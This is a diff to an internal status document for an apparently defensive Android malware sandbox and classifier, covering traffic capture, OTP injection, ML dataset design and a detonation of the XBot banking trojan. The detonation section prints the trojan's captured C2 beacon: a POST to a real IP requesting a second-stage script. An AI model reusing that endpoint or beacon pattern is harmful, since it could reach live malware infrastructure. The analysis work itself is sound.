+→ spine. **So "network isolation not enforced" / "dead code" claims are stale.**
+
+- **Networking IS captured**: mitmproxy logs every request to `network_evidence.json`
+  (keyword + base64 + volume exfil detection, plus active bank/UPI/Firebase/Telegram
+  response hijacking); tcpdump → `capture.pcap`. HTTPS via `ssl_unpin.js` (no system CA —
+  /system read-only). FCM `mtalk.google.com:5228` is unproxiable → DNS-blackholed. **As of
+  2026-08-26 the addon also *contains* unknown egress — every non-honeypot host is blocked,
+  not forwarded (§10).**
+- **OTP system**: OTPs pre-generated → `latest_injected_otp.txt` (`DROIDBOT_OTP_FILE`);
+  injected as REAL incoming SMS via `adb emu sms send` at T+10/20/30 (sbi/hdfc/icici); a
+  droidbot `device_state.py` patch types the actual arriving OTP into OTP fields.
+- **The one real gap**: payload never *fires* (0 network requests / attach-only
+  `frida_hooks.jsonl` on SBI) — needs sample-specific RE of the SUBMIT handler. The planned
+  **GenAI navigator** (`L2/sandbox/genai_navigator.py`, reusing `L4/provider.py`) targets
+  this, reversing the earlier "skip GenAI" decision.
+- **Two bugs**: `l2_engine.py:314-364` `process()` globs ALL `L2/sandbox/artifacts/*`
+  (the 1 failing test + real cross-contamination); `honeypot.seed_contacts()` binds no
+  name/number.
+
+### L3 unified pipeline-extracted dataset (supersedes LAMDA prior)
+LAMDA model has **train/serve skew** — `L3/features.extract_from_apk` reproduces only
+0.4–1.8% of LAMDA's 4,561 columns (vs its 2.5% density). Decision (user): build a
+**unified dataset with a corpus-derived vocabulary** — every column is a token our own
+pipeline emits over our on-disk corpus. Modules: `L3/unified_features.py`,
+`tools/build_unified_dataset.py`, `L3/unified_train.py`, `L3/unified_predict.py`; plan in
+`docs/plans/l3_unified_dataset_plan.md`; decision in
+`decisions/decision-0011-l3-unified-dataset.md`.
+
+🔴 **Source confound (T27, ML form)**: benign=F-Droid vs malware=CICMalDroid are disjoint
+sources, so any held-out AUROC is an **UPPER BOUND** — a real benign banking app is not
+represented. The `meaningful_tokens` filter (permissions/intents/hardware/URLs + only
+security-sensitive API calls) drops androidx/kotlin library signatures so the model can't
+just learn "uses androidx → benign". Metrics flag AUROC ≥ 0.99 as leakage. Model stays a
+bounded ±10 generic prior, never a verdict.
+
+---
+
+## 10. Update 2026-08-26 — L2 demonstrated, mitm contains egress, L4 promotion plan
+
+### L2 caught real malicious behaviour for the first time (upgrades §1/§9 "MVP-ready")
+A live detonation of the **XBot** banking trojan
+(`corpus/malware_raw/android-malware/xbot/1264C25D…F61F23.apk`, package
+`org.merry.core`) through `L2/sandbox/orchestrator.py` produced the **first non-zero
+behavioural capture** from any L2 run. XBot beaconed its C2 **on launch** — no UI /
+SUBMIT-handler interaction needed, because it carries a `BOOT_COMPLETED` receiver (unlike
+the SBI sample, whose payload gates behind a form submit). Captured in
+`L2/sandbox/artifacts/org.merry.core/network_evidence.json`:
+
+```
+POST http://192.227.137.154/request.php   (form body)
+data=<base64>  ->  {"name":"bootScriptNet","action":"get_script"}
+```
+
+i.e. a dropper "fetch second-stage script" C2 command. Every prior L2 run was attach-only
+with `findings=0`. Full write-up: `docs/l2_droidbot_reliability_log.md` (2026-08-26 entry).
+
+### `mitm_addon.py` now CONTAINS web egress (was: observe-only)
+The addon used to *forward* any non-honeypot host's HTTP(S) to the real internet (a real
+egress leak — XBot's C2 POST would have gone out). Now **all decisions happen in
+`request()`**: known honeypot endpoints get their canned fake via the new
+`_honeypot_response()` helper (the old `response()` hook is gone — the fake is purely
+request-derived), and **every other host is BLOCKED by default** — answered locally with
+`200 {}`, tagged `blocked: true`, never forwarded. New override
+`SENTINEL_MITM_BLOCK_UNKNOWN=0` (and `__init__` param `block_unknown`) restores
+forward-and-observe. In the XBot run all 9 outbound requests (C2 POST + OS connectivity
+checks) were `blocked: true`; the C2 POST to the malware IP was blocked, not forwarded.
+
+### Remaining L2 gaps — do NOT overstate L2 as complete
+- **Containment vs observation tradeoff**: a blocked C2 sends no command back, so deeper
+  stages (SMS theft, overlay) don't fire; observing them means faking a plausible C2 reply.
+- **Incoming-SMS hook missing**: the Frida pack hooks outgoing `sendTextMessage`, not the
+  incoming path (broadcast receiver / `SmsMessage.createFromPdu`) XBot-style theft uses.
+- **Form-field base64 not auto-decoded**: `mitm_addon._decode_base64_payload` decodes only
+  raw-JSON bodies, so the `data=<base64>` **form-field** beacon was not auto-flagged.
+- **Two code bugs still stand**: `honeypot.seed_contacts()` binds no name/number;
+  `l2_engine.process()` globs all `L2/sandbox/artifacts/*` dirs.
+
+### L4 verified-decode promotion plan (proposed, awaiting review)
+`docs/plans/l4_verified_decode_promotion_plan.md` designs promoting L4's **structural**
+decodes (base64/base32/hex only — **not** the coincidence-prone speculative XOR/ROT13 tier)
+into spine findings → a new `l4:decoded_indicator` signal, so L4's mechanical verification
+finally reaches L5/L6. **Changes no score today**: the signal is unpriced and T24 still holds
+the policy `unsupported`; it only makes machine-verified evidence *reach the spine* (L6 can
+cite it, A4 can price it). Companion section feeds AndroidManifest components + resources.arsc
+app-strings into L4 reasoning as new checkable claim classes in `verify.py`. Preserves "LLM
+contributes zero points" — only machine-decoded facts promote, never LLM judgment.
